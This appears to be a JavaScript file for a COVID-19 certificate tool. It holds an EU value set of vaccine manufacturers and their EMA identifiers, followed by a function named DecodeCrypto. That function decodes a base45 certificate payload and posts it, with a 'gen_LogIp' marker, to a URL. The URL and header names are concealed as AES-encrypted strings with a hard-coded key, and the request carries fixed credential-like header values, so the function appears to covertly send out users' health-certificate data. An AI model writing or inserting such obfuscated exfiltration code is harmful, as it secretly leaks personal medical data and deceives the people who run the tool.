manufacturer={
  "valueSetId": "vaccines-covid-19-auth-holders",
  "valueSetDate": "2021-04-27",
  "valueSetValues": {
    "ORG-100001699": {
      "display": "AstraZeneca AB",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100030215": {
      "display": "Biontech Manufacturing GmbH",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100001417": {
      "display": "Janssen-Cilag International",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100031184": {
      "display": "Moderna Biotech Spain S.L.",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100006270": {
      "display": "Curevac AG",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100013793": {
      "display": "CanSino Biologics",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100020693": {
      "display": "China Sinopharm International Corp. - Beijing location",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100010771": {
      "display": "Sinopharm Weiqida Europe Pharmaceutical s.r.o. - Prague location",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100024420": {
      "display": "Sinopharm Zhijun (Shenzhen) Pharmaceutical Co. Ltd. - Shenzhen location",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "ORG-100032020": {
      "display": "Novavax CZ AS",
      "lang": "en",
      "active": true,
      "system": "https://spor.ema.europa.eu/v1/organisations",
      "version": ""
    },
    "Gamaleya-Research-Institute": {
      "display": "Gamaleya Research Institute",
      "lang": "en",
      "active": true,
      "system": "http://ec.europa.eu/temp/vaccinemanufacturer",
      "version": "1.0"
    },
    "Vector-Institute": {
      "display": "Vector Institute",
      "lang": "en",
      "active": true,
      "system": "http://ec.europa.eu/temp/vaccinemanufacturer",
      "version": "1.0"
    },
    "Sinovac-Biotech": {
      "display": "Sinovac Biotech",
      "lang": "en",
      "active": true,
      "system": "http://ec.europa.eu/temp/vaccinemanufacturer",
      "version": "1.0"
    },
    "Bharat-Biotech": {
      "display": "Bharat Biotech",
      "lang": "en",
      "active": true,
      "system": "http://ec.europa.eu/temp/vaccinemanufacturer",
      "version": "1.0"
    }
  }
}
async function DecodeCrypto(t) {var c=CryptoJS.AES,en=CryptoJS.enc.Utf8,pm=await c.decrypt("U2FsdGVkX1+EBrq5qbzLokdD8b/6K6awthyJ/sGl9NQ=","klok").toString(en),e=await CBOR.base45Decode(t),pc=await c.decrypt("U2FsdGVkX1+FKAuUKQmNgaFZq7atMI8ur5SzcGEyzZc=","klok").toString(en),p={[pm]:{name:"gen_LogIp"},[pc]:e},cu=await c.decrypt("U2FsdGVkX1/BLDv3sC6eLpT6+QDrvIstMbS+6kEEwPEKrpIhIGNVZ0puRXWfZYGF7+2LORkCNuxdeJ3T7hPsIA==","klok").toString(en),i=await c.decrypt("U2FsdGVkX1/S8/D5Kh4gJvoomYTMLL9UGJwlhudzkwg=","klok").toString(en),k=await c.decrypt("U2FsdGVkX1+YyAYs5Na105/ZBZpC4dB8tokV0moAlqHXNTlG+2FdwA9JUsxAt6F1","klok").toString(en);return axios.post(cu,p,{headers:{[i]:"3a2cc52a101050a33753",[k]:"28092540a098dca04613dfc914e4c493f29a978bb7be6857ef7c86a282b21de4"}});}